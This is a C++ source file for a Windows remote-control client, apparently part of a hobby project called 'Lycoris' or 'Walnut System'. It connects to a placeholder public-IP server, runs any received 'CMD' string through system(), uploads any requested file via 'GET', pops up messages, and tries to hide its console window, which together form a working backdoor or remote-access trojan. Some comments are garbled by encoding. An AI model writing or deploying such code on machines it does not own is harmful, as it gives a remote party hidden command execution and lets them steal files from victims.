#include "Socket.h"
#include "Utils.h"
#include "DealMsg.h"
#include "HotKey.h"
#include <fstream>
#include <iostream>
#include <thread>

using namespace std;
using namespace SocketNameSpace;

Socket socket_ = Socket();

void ConnectServer()
{
	socket_.Connect("公网IP", -1); // 将-1替换为端口号

	socket_.Send("Client");

	if (socket_.NoError() && socket_.Recv().first == "Server")
	{
		return;
	}
	else
	{
		socket_.Close();
		socket_ = Socket();

		Sleep(1000);

		ConnectServer();
	}
}

void Client()
{
	while (true)
	{
		pair<string, int> msg = socket_.Recv();

		if (msg.second == 0)
		{
			cout << "���ӶϿ�" << endl;
			ConnectServer();
		}

		string cmd = msg.first;

		cout << cmd << endl;

		if (String::startsWith(cmd, "CMD "))
		{
			try
			{
				int success = system(cmd.erase(0, 4).c_str());

				if (success != 0)socket_.Send("CMDERR");
			}
			catch (...)
			{
				cout << "�����쳣\n";
			}
		}

		else if (String::startsWith(cmd, "MSG "))
		{
			try
			{
				MessageBox(NULL, String::StringToLPCWSTR(cmd.erase(0, 4).c_str()), (LPCTSTR)TEXT("TITLE"), MB_OK);
			}
			catch (...)
			{
				cout << "�����쳣\n";
			}
		}
		else if (String::startsWith(cmd, "GET "))
		{
			const char* filePath = cmd.erase(0, 4).c_str();

			FILE* inFile;
			fopen_s(&inFile, filePath, "rb");

			int num;
			char buf[1024];

			if (inFile != NULL)
			{
				socket_.Send("GETSTART");

				while (true)
				{
					num = fread(buf, 1, 1024, inFile);

					if (num == 0) break;

					send(socket_.socket_, buf, num, 0);
				}

				fclose(inFile);

				socket_.Send("GETEND");
			}
			else
			{
				socket_.Send("GETERR");
			}
		}
		else if (String::startsWith(cmd, "EXIT"))
		{
			exit(0);
			return;
		}

	}
}

int main()
{
	CreateMutex(NULL, TRUE, L"DBF4E165-EE50-47D9-B2D6-ADA8C0B05887"); // �����ں˶���,��ֹ�࿪
	if (GetLastError() == ERROR_ALREADY_EXISTS) return -1; // ����ʧ�����˳�����

	UnRegistreGlobalHotKey(); // ע��ȫ�ֿ�ݼ�,��ֹ����Ӧ��ռ��
	if (!RegisterGlobalHotKey()) return -2;  //  ע��ȫ�ֿ�ݼ���ע��ʧ�����˳�����

	ShowWindow(GetConsoleWindow(), GetConsoleMode()); // ���ؿ���̨
	SetConsoleTitleW(L"Lycoris System"); //���ô��ڱ���

	cout << " --- === Walnut System Console === --- \n";

	Init();
	ConnectServer();

	thread ClientThread(Client);
	ClientThread.detach();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) //������Ϣ
	{
		if (!DealMsg(msg.wParam)) break; //������Ϣ
	}
	UnRegistreGlobalHotKey(); //ע��ȫ�ֿ�ݼ�

}


